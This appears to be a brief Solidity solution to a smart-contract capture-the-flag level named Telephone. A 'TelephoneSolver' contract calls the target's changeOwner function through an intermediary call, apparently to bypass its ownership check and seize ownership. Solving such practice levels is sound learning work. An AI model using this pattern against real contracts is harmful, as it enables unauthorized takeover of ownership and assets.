// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneSolver {

    function callChangeOwner(ITelephone _telephone) public {
        _telephone.changeOwner(msg.sender);
    }
}

interface ITelephone {
    function changeOwner(address _owner) external;
}